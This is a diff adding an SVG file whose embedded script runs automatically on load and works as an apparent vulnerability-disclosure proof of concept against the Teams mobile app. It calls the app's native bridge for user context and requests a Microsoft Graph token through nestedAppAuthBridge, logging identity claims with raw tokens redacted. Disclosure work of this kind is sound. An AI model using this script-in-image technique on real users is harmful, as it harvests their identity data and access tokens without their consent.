@@ -1,0 +1,357 @@
+<?xml version="1.0" standalone="no"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="1100" height="760" viewBox="0 0 1100 760">
+  <rect width="1100" height="760" fill="#0b1020"/>
+  <rect x="26" y="24" width="1048" height="712" rx="10" fill="#101827" stroke="#38507a" stroke-width="2"/>
+  <text x="52" y="66" fill="#f8fafc" font-family="monospace" font-size="24" font-weight="700">Ofek Levin MSRC Teams Mobile App Boundry Report</text>
+  <text x="52" y="100" fill="#93c5fd" font-family="monospace" font-size="15">Local display only. Raw tokens are not printed, stored globally, or sent off-device.</text>
+  <text id="status" x="52" y="138" fill="#dbeafe" font-family="monospace" font-size="14">starting...</text>
+  <foreignObject x="52" y="160" width="996" height="548">
+    <div xmlns="http://www.w3.org/1999/xhtml" id="log" style="height:548px;overflow:auto;white-space:pre-wrap;word-break:break-word;color:#dbeafe;background:#050914;border:1px solid #334155;border-radius:8px;padding:14px;font:13px/1.45 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;"></div>
+  </foreignObject>
+  <script type="text/javascript"><![CDATA[
+(function () {
+  "use strict";
+
+  var APP_CLIENT_ID = "03abeb20-8ed4-4331-bf1c-31e607ee4e50";
+  var GRAPH_SCOPE = "https://graph.microsoft.com/User.Read";
+  var AUTHORITY = "https://login.microsoftonline.com/common";
+  var nativeNextId = 73000;
+  var nativePending = {};
+  var previousNativeHandler = window.onNativeMessage;
+  var logEl = document.getElementById("log");
+  var statusEl = document.getElementById("status");
+  var publicState = { logs: [] };
+  window.__ofekMsrcTeamsBoundaryPoc = publicState;
+
+  function setStatus(text) {
+    if (statusEl) statusEl.textContent = text;
+  }
+
+  function write(label, value) {
+    var safe = sanitize(value);
+    var line = "[" + new Date().toISOString() + "] " + label + "\n" + stringify(safe) + "\n\n";
+    publicState.logs.push({ label: label, value: safe });
+    if (logEl) logEl.textContent += line;
+    if (logEl) logEl.scrollTop = logEl.scrollHeight;
+    try { console.log("[ofek-msrc-teams-boundary]", label, safe); } catch (_) {}
+  }
+
+  function stringify(value) {
+    return typeof value === "string" ? value : JSON.stringify(value, null, 2);
+  }
+
+  function uuidish(prefix) {
+    if (window.crypto && typeof window.crypto.randomUUID === "function") return window.crypto.randomUUID();
+    return prefix + "-" + Date.now().toString(16) + "-" + Math.random().toString(16).slice(2);
+  }
+
+  function wait(ms) {
+    return new Promise(function (resolve) { setTimeout(resolve, ms); });
+  }
+
+  function waitForBridge(timeoutMs) {
+    var deadline = Date.now() + timeoutMs;
+    return new Promise(function (resolve) {
+      (function check() {
+        if (window.nativeInterface || window.webAppMessageListener || window.nestedAppAuthBridge) return resolve(true);
+        if (Date.now() >= deadline) return resolve(false);
+        setTimeout(check, 100);
+      })();
+    });
+  }
+
+  function postToTeams(payload) {
+    if (window.nativeInterface && typeof window.nativeInterface.framelessPostMessage === "function") {
+      window.nativeInterface.framelessPostMessage(payload);
+      return true;
+    }
+    if (window.webAppMessageListener && typeof window.webAppMessageListener.postMessage === "function") {
+      window.webAppMessageListener.postMessage(payload);
+      return true;
+    }
+    return false;
+  }
+
+  function sendNativeEvent(func, args, id) {
+    return postToTeams(JSON.stringify({
+      id: typeof id === "number" ? id : -1,
+      func: func,
+      args: args || [],
+      timestamp: Date.now()
+    }));
+  }
+
+  function callNative(func, args, timeoutMs) {
+    var id = nativeNextId++;
+    return new Promise(function (resolve, reject) {
+      var timer = setTimeout(function () {
+        delete nativePending[id];
+        reject(new Error("Timed out waiting for native " + func));
+      }, timeoutMs || 8000);
+      nativePending[id] = { resolve: resolve, reject: reject, timer: timer };
+      if (!sendNativeEvent(func, args || [], id)) {
+        clearTimeout(timer);
+        delete nativePending[id];
+        reject(new Error("Teams native bridge object was not found"));
+      }
+    });
+  }
+
+  window.onNativeMessage = function (event) {
+    var message = event && Object.prototype.hasOwnProperty.call(event, "data") ? event.data : event;
+    if (typeof message === "string") {
+      try { message = JSON.parse(message); } catch (_) {}
+    }
+    if (message && typeof message.id === "number" && nativePending[message.id]) {
+      var slot = nativePending[message.id];
+      delete nativePending[message.id];
+      clearTimeout(slot.timer);
+      slot.resolve(normalizeNativeReply(message));
+    }
+    if (typeof previousNativeHandler === "function") {
+      try { previousNativeHandler.call(window, event); } catch (_) {}
+    }
+  };
+
+  function normalizeNativeReply(message) {
+    if (!message || !Array.isArray(message.args)) return message;
+    return message.args.length === 1 ? message.args[0] : message.args;
+  }
+
+  function nestedPayload(method, params) {
+    return {
+      clientLibrary: "ofek-msrc-teams-mobile-boundary-report",
+      clientLibraryVersion: "0.1",
+      messageType: "NestedAppAuthRequest",
+      method: method,
+      requestId: uuidish("naa"),
+      sendTime: Date.now(),
+      tokenParams: params || null
+    };
+  }
+
+  function tokenParams() {
+    return {
+      clientId: APP_CLIENT_ID,
+      authority: AUTHORITY,
+      scope: GRAPH_SCOPE,
+      correlationId: uuidish("corr"),
+      claims: null,
+      authenticationScheme: null,
+      shrClaims: null,
+      shrNonce: null,
+      resourceRequestMethod: null,
+      resourceRequestUri: null
+    };
+  }
+
+  function callNestedAppAuth(payload, timeoutMs) {
+    return new Promise(function (resolve, reject) {
+      var bridge = window.nestedAppAuthBridge;
+      if (!bridge || typeof bridge.postMessage !== "function") {
+        reject(new Error("nestedAppAuthBridge was not found"));
+        return;
+      }
+
+      var done = false;
+      var previous = bridge.onmessage;
+      var removeListener = null;
+      var timer = setTimeout(function () {
+        finish(new Error("Timed out waiting for nestedAppAuthBridge"), true);
+      }, timeoutMs || 20000);
+
+      function finish(value, isError) {
+        if (done) return;
+        done = true;
+        clearTimeout(timer);
+        if (removeListener) removeListener();
+        bridge.onmessage = previous;
+        if (isError) reject(value);
+        else resolve(value);
+      }
+
+      function parseReply(reply) {
+        var data = reply && Object.prototype.hasOwnProperty.call(reply, "data") ? reply.data : reply;
+        if (typeof data === "string") {
+          try { return JSON.parse(data); } catch (_) { return data; }
+        }
+        return data;
+      }
+
+      function handleReply(reply) {
+        var parsed = parseReply(reply);
+        if (parsed && parsed.requestId && parsed.requestId !== payload.requestId) return;
+        if (!parsed || (!parsed.requestId && parsed.messageType !== "NestedAppAuthResponse")) return;
+        finish(parsed, false);
+      }
+
+      try {
+        bridge.onmessage = function (event) {
+          handleReply(event);
+          if (typeof previous === "function") {
+            try { previous.call(bridge, event); } catch (_) {}
+          }
+        };
+        if (typeof bridge.addEventListener === "function" && typeof bridge.removeEventListener === "function") {
+          bridge.addEventListener("message", handleReply);
+          removeListener = function () { bridge.removeEventListener("message", handleReply); };
+        }
+        var returned = bridge.postMessage(JSON.stringify(payload));
+        if (returned && typeof returned.then === "function") {
+          returned.then(handleReply, function (err) { finish(err, true); });
+        } else if (typeof returned !== "undefined") {
+          handleReply(returned);
+        }
+      } catch (e) {
+        finish(e, true);
+      }
+    });
+  }
+
+  function jwtPayload(token) {
+    try {
+      if (typeof token !== "string" || token.split(".").length !== 3) return null;
+      var payload = token.split(".")[1].replace(/-/g, "+").replace(/_/g, "/");
+      payload += "=".repeat((4 - payload.length % 4) % 4);
+      return JSON.parse(atob(payload));
+    } catch (e) {
+      return { decodeError: String(e && e.message || e) };
+    }
+  }
+
+  function jwtSummary(token) {
+    var payload = jwtPayload(token);
+    if (!payload) return null;
+    var keep = {};
+    ["aud", "iss", "tid", "oid", "sub", "ver", "exp", "iat", "nbf", "name", "preferred_username", "upn", "scp", "roles", "appid", "azp"].forEach(function (key) {
+      if (Object.prototype.hasOwnProperty.call(payload, key)) keep[key] = payload[key];
+    });
+    keep.claimKeys = Object.keys(payload).sort();
+    return keep;
+  }
+
+  function summarizeContext(value) {
+    return collectFields(value, /(^|\.)(app|host|frame|entity|user|upn|userPrincipalName|loginHint|email|tenant|tid|oid|objectId|aadObjectId|account|locale|teamId|channelId|chatId|theme|ring)($|\.)/i, "", {});
+  }
+
+  function summarizeNaa(response) {
+    var token = response && response.token;
+    var initContext = response && response.initContext;
+    var account = (token && token.account) || response.account || (initContext && initContext.accountContext) || null;
+    var error = response && response.error;
+    return {
+      requestId: response && response.requestId || null,
+      messageType: response && response.messageType || null,
+      success: !!(response && response.success),
+      tokenPresent: !!token,
+      accessTokenPresent: !!(token && typeof token.access_token === "string" && token.access_token.length),
+      idTokenPresent: !!(token && typeof token.id_token === "string" && token.id_token.length),
+      accessTokenLength: token && token.access_token ? token.access_token.length : 0,
+      idTokenLength: token && token.id_token ? token.id_token.length : 0,
+      scope: token && token.scope || null,
+      expiresIn: token && token.expires_in || null,
+      accessTokenClaims: token ? jwtSummary(token.access_token) : null,
+      idTokenClaims: token ? jwtSummary(token.id_token) : null,
+      account: account ? collectFields(account, /(^|\.)(homeAccountId|environment|realm|tenant|tenantId|username|userPrincipalName|name)($|\.)/i, "", {}) : null,
+      initContext: initContext ? collectFields(initContext, /(^|\.)(sdkName|sdkVersion|account|tenant|username|name|environment)($|\.)/i, "", {}) : null,
+      errorStatus: error && error.status || null,
+      errorCode: error && error.code || null,
+      errorSubError: error && error.subError || null
+    };
+  }
+
+  function collectFields(value, matcher, prefix, out) {
+    if (!value || typeof value !== "object") return out;
+    Object.keys(value).forEach(function (key) {
+      var path = prefix ? prefix + "." + key : key;
+      var item = value[key];
+      if (matcher.test(path) && (typeof item === "string" || typeof item === "number" || typeof item === "boolean" || item === null)) {
+        out[path] = item;
+      }
+      if (item && typeof item === "object" && !Array.isArray(item)) collectFields(item, matcher, path, out);
+    });
+    return out;
+  }
+
+  function redactString(value, key) {
+    if (typeof value !== "string") return value;
+    if (/token|assertion|secret|password|refresh/i.test(key || "")) return "[redacted:" + value.length + " chars]";
+    if (/^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/.test(value)) return "[redacted-jwt:" + value.length + " chars]";
+    return value;
+  }
+
+  function sanitize(value, key) {
+    if (typeof value === "string") return redactString(value, key);
+    if (Array.isArray(value)) return value.map(function (item) { return sanitize(item); });
+    if (value && typeof value === "object") {
+      var out = {};
+      Object.keys(value).forEach(function (name) { out[name] = sanitize(value[name], name); });
+      return out;
+    }
+    return value;
+  }
+
+  async function run() {
+    setStatus("waiting for Teams bridge objects...");
+    write("location", {
+      href: location.href,
+      origin: location.origin,
+      host: location.host,
+      userAgent: navigator.userAgent
+    });
+    await waitForBridge(6000);
+    write("bridge objects", {
+      nativeInterface: !!window.nativeInterface,
+      framelessPostMessage: !!(window.nativeInterface && window.nativeInterface.framelessPostMessage),
+      webAppMessageListener: !!window.webAppMessageListener,
+      nestedAppAuthBridge: !!window.nestedAppAuthBridge,
+      microsoftTeams: !!window.microsoftTeams
+    });
+
+    sendNativeEvent("initialize", [], -1);
+    sendNativeEvent("appInitialization.success", [], -1);
+    await wait(300);
+
+    setStatus("calling getContext...");
+    try {
+      var context = await callNative("getContext", [], 10000);
+      write("getContext result summary", summarizeContext(context));
+      write("getContext raw with token-like fields redacted", context);
+    } catch (e) {
+      write("getContext error", String(e && e.message || e));
+    }
+
+    setStatus("calling nestedAppAuthBridge.GetInitContext...");
+    try {
+      var init = await callNestedAppAuth(nestedPayload("GetInitContext"), 20000);
+      write("nestedAppAuthBridge GetInitContext summary", summarizeNaa(init));
+    } catch (e) {
+      write("nestedAppAuthBridge GetInitContext error", String(e && e.message || e));
+    }
+
+    setStatus("requesting redacted Graph User.Read token...");
+    try {
+      var params = tokenParams();
+      write("nestedAppAuthBridge GetToken request", {
+        clientId: params.clientId,
+        scope: params.scope,
+        authority: params.authority
+      });
+      var tokenResponse = await callNestedAppAuth(nestedPayload("GetToken", params), 30000);
+      write("nestedAppAuthBridge GetToken redacted summary", summarizeNaa(tokenResponse));
+      write("nestedAppAuthBridge GetToken response with token-like fields redacted", tokenResponse);
+    } catch (e) {
+      write("nestedAppAuthBridge GetToken error", String(e && e.message || e));
+    }
+
+    setStatus("complete - review output below");
+  }
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", function () { setTimeout(run, 500); });
+  } else {
+    setTimeout(run, 500);
+  }
+})();
+  ]]></script>
+</svg>
